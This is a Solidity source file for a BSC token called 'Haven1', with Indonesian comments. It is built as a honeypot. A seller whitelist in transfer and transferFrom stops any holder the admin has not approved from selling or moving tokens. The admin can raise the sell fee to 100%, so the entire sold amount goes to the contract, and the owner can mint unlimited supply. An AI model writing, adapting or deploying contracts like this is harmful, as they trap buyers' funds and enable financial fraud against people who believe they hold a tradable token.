// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }
}

contract NEWBSCCONTRACT {
    using SafeMath for uint256;

    string public name = "Haven1";
    string public symbol = "H1";
    uint256 public totalSupply = 210000000000000000000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // ===== WHITELIST PENJUAL =====
    // Hanya alamat dengan canSell == true yang boleh melakukan transfer/transferFrom
    mapping(address => bool) public canSell;
    bool public whitelistEnabled = true; // admin bisa matikan jika perlu

    address public owner;
    address public admin; // admin utama untuk whitelist

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event SellerUpdated(address indexed account, bool allowed);
    event WhitelistToggled(bool enabled);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyAdmin() {
        require(msg.sender == owner || msg.sender == admin, "Not admin");
        _;
    }

    constructor(address _admin) {
        owner = msg.sender;
        admin = _admin;
        balanceOf[msg.sender] = totalSupply;
    }

    // ===================================================
    //          FUNGSI ADMIN: INPUT SIAPA YANG BISA JUAL
    // ===================================================

    /// @notice Tambah / hapus 1 alamat dari whitelist penjual
    function setSeller(address account, bool allowed) public onlyAdmin {
        require(account != address(0), "Zero address");
        canSell[account] = allowed;
        emit SellerUpdated(account, allowed);
    }

    /// @notice Tambah / hapus banyak alamat sekaligus (batch)
    function setSellers(address[] calldata accounts, bool allowed) public onlyAdmin {
        for (uint256 i = 0; i < accounts.length; i++) {
            require(accounts[i] != address(0), "Zero address");
            canSell[accounts[i]] = allowed;
            emit SellerUpdated(accounts[i], allowed);
        }
    }

    /// @notice Ganti admin (yang berhak input penjual)
    function setAdmin(address newAdmin) public onlyOwner {
        require(newAdmin != address(0), "Zero address");
        admin = newAdmin;
    }

    /// @notice Aktifkan / matikan mode whitelist
    function setWhitelistEnabled(bool enabled) public onlyAdmin {
        whitelistEnabled = enabled;
        emit WhitelistToggled(enabled);
    }

    // ===================================================
    //                    TRANSFER
    // ===================================================

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");
        require(_to != address(0), "Invalid recipient");
        // Cek whitelist penjual
        _checkSeller(msg.sender);

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
        require(_to != address(0), "Invalid recipient");
        // Cek whitelist penjual
        _checkSeller(_from);

        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }
        return true;
    }

    /// @dev Internal: cek apakah penjual diizinkan
    function _checkSeller(address account) internal view {
        if (whitelistEnabled) {
            require(canSell[account] || account == owner, "Seller not whitelisted");
        }
    }

    // ===================================================
    //                    APPROVE
    // ===================================================

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    // ===================================================
    //                    FEE
    // ===================================================

    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAdmin {
        require(newBuyFee <= 100, "Buy fee too high");
        require(newSellFee <= 100, "Sell fee too high");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    // ===================================================
    //                    MINT
    // ===================================================

    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(msg.sender, amount);
        return true;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "Mint to zero address");
        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    // ===================================================
    //                    OWNERSHIP
    // ===================================================

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}